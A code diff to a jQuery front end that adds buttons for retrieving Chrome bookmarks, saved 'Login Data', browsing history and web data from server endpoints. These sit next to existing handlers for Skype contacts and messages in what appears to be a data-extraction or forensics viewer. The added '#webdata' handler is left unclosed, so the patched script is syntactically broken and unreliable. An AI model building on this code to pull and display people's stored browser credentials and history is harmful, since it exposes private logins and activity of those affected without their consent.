@@ -283,6 +283,44 @@ $("#skypeContacts").click(function(e) {
     });
 });
 
+// Chrome Bookmarks 
+$("#bookmarks").click(function() {
+    $("#table_div").hide()
+    $.get("/getChromeBookmarks", function(data, status) {
+        console.log(data)
+        $("#contactsTable").html(data)
+
+    });
+});
+
+// Login Data 
+$("#login").click(function() {
+    $("#table_div").hide()
+    $.get("/getChromeLogin", function(data, status) {
+        console.log(data)
+        $("#contactsTable").html(data)
+
+    });
+});
+// Chrome Browser History 
+$("#history").click(function() {
+    $("#table_div").hide()
+    $.get("/getChromeHistory", function(data, status) {
+        console.log(data)
+        $("#contactsTable").html(data)
+
+    });
+});
+
+// Chrome Web Data 
+$("#webdata").click(function() {
+    $("#table_div").hide()
+    $.get("/getChromeWebData", function(data, status) {
+        console.log(data)
+        $("#contactsTable").html(data)
+
+
+
 // Get Skype Messages
 $("#skypeMessages").click(function(e) {
     e.preventDefault()
@@ -290,5 +328,6 @@ $("#skypeMessages").click(function(e) {
     $.get("/getSkypeMessages", function(data, status) {
         console.log(data)
         $("#contactsTable").html(data)
+
     });
 });
